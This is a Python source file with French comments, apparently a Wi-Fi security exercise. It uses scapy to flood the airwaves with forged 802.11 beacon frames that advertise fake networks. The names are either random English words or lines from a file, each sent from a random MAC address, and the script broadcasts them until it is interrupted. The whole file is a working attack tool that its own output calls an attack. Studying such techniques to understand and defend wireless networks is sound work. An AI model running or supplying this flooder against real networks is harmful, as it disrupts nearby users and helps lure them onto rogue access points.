import argparse
import subprocess
import threading
import time
import curses
import datetime
import sys
from chance import chance
from scapy.all import *
#source : https://stackoverflow.com/questions/15318208/capture-control-c-in-python
#source : https://github.com/davitv/chance
print("Emission de beacons avec des noms selon un fichier ou au hasard. Utilisez CTRL+C pour quitter ou stopper l'attaque.")
try:
    parser = argparse.ArgumentParser(description="Ce script permet de générer de faux SSID selon les entrée d'un fichier ou avec des noms aléatoire.")
    parser.add_argument("-f", "--file",type=str, help="Le fichier contenant les noms d'ap souhaités.")
    parser.add_argument("-i", "--interface", required=True, help="L'interface à utiliser")
    arguments = parser.parse_args()
    packets = []
    #Si aucun fichier n'est passé en parametre, on demande un chiffre à l'utilisateur
    if(arguments.file is None):
            try:
                nbSSID = int(input("Entrez le nombre de SSID que vous souhaitez avoir\n"))
                for i in range(0,nbSSID):
                    #Creation des packets beacons a la vollée depuis une adresse MAC aléatoire et un SSID étant un nom anglais aléatoire.
                    src = RandMAC()
                    nom = chance.word(language="en")
                    packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=nom) / Dot11Elt())
                    print("Un wifi est disponible avec le nom:",nom)
            #Crash du soft si l'utilisateur entre pas un nombre.
            except:
                print("Merci d'entrer un nombre!")
                sys.exit()
    #Si un fichier est spécifié, chaque ligne est un nom de wifi
    else:   
        files = open(arguments.file,"r")
        lines = files.readlines()
        for line in lines:
            src = RandMAC()
            packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=line) / Dot11Elt())
            print("Un wifi est disponible avec le nom:",line)
    #On envoie des beacons indéfiniment jusqu'a interuption de l'utilisateur
    while(1):
        for packet in packets:
            sendp(packet,inter=0.000001, iface=arguments.interface, verbose=0)
except KeyboardInterrupt:
    print("\nAu revoir!")
    sys.exit()